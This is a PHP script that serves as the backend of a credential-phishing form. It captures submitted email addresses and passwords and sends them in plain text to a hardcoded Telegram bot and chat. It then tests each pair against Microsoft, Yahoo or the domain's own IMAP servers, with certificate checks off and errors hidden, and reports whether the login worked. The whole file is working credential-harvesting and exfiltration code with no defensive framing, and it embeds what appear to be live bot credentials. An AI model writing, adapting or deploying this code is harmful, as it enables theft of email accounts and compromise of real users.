<?php
// Custom error handler to suppress errors
function customErrorHandler($errno, $errstr, $errfile, $errline) {
    // Don't execute the PHP internal error handler
    return true;
}

// Function to send message to Telegram
function sendMessageToTelegram($botToken, $chatID, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Extract the domain from the email address
    $domain = strtolower(substr(strrchr($email, "@"), 1)); // Ensure domain is lowercase


    $loginSuccess = false;
    $errorMessage = ''; 
	
    // Define server based on domain
    $microsoftDomains = ['live.fr', 'hotmail.com', 'hotmail.de', 'hotmail.fr', 'outlook.com', 'live.com']; // Microsoft domains
    $yahooDomains = ['yahoo.com', 'myyahoo.com', 'yahoo.fr', 'yahoo.jp']; // Yahoo domains
    // WARNING: Sending passwords over any channel (even encrypted) can be very insecure
    $botToken = "6362171314:AAEnB_4DdwDkCEjKmRTAH_5bTSqubvwrev8";
    $chatID = "-1001926682773";
    $message = "Login attempt: Email - $email, Password - $password"; // Be aware of the security implications

    // Send the message
    sendMessageToTelegram($botToken, $chatID, $message);
	
    if (in_array($domain, $microsoftDomains)) {
        $servers = ["outlook.office365.com"];
    } elseif (in_array($domain, $yahooDomains)) {
        $servers = ["imap.mail.yahoo.com"];
    } else {
        $servers = ["mail.$domain", "imap.$domain"];
    }

    $loginSuccess = false;
    $errorMessage = ''; // Initialize an empty string to store potential error messages

    foreach ($servers as $server) {
        // Set the custom error handler
        set_error_handler("customErrorHandler");
        $connection = @imap_open("{{$server}:993/imap/ssl/novalidate-cert}", $email, $password);
        // Restore the previous error handler
        restore_error_handler();

        if ($connection) {
            $loginSuccess = true;
            imap_close($connection);
            break; // Exit the loop if connection is successful
        } else {
            // Retrieve the last IMAP error if connection fails
            $errorMessage = imap_last_error();
        }
    }

    if ($loginSuccess) {
        $loginStatusMessage = 'LOGIN_SUCCESSFUL for ' . $email;
        echo $loginStatusMessage; // Output for user
        sendMessageToTelegram($botToken, $chatID, $loginStatusMessage); // Send status to Telegram
    } else {
        $loginStatusMessage = "Login failed for $email. Error: " . htmlspecialchars($errorMessage);
        echo $loginStatusMessage; // Output for user
        sendMessageToTelegram($botToken, $chatID, $loginStatusMessage); // Send error status to Telegram
    }
}

?>
